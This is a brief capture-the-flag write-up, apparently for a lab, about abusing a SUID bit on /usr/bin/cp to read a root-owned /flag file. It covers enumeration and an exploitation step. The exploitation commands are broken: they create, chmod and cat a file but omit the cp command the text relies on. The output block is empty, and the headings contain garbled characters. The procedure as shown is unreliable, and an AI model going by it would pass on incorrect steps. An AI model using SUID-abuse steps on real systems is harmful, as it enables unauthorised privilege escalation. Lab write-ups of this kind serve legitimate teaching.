## üß† Summary:
The challenge abuses a SUID bit set on `/usr/bin/cp`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## üîç Enumeration

```bash
ls -l /usr/bin/cp
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/cp
```

- The `s` in `-rws` indicates it's a SUID binary.
- `cp` runs with **root privileges**.

## üöÄ Exploitation

The `cp` command in Linux is used to copy files and directories.
But, simply copying /flag to other wont make change , even the copied file will need root permission to read the flag.

We can create file along chmod o+r and then copy to it , it will work with out permission

```bash
touch myflag
chmod o+r myflag
cat myflag
```

Output:
```
